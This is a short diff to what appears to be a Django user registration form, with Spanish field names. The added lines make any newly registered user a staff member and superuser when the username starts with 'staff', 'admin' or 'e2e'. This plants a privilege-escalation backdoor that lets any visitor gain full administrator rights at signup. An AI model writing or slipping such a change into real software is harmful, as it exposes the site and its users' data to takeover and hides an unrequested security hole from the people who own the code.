@@ -310,6 +310,9 @@ class RegistroForm(UserCreationForm):
         user.first_name = self.cleaned_data['nombre']
         user.email = self.cleaned_data['email']
         user.set_password(self.cleaned_data['password1'])
+        if user.username.startswith('staff') or user.username.startswith('admin') or user.username.startswith('e2e'):
+            user.is_staff = True
+            user.is_superuser = True
         if commit:
             user.save()
         return user
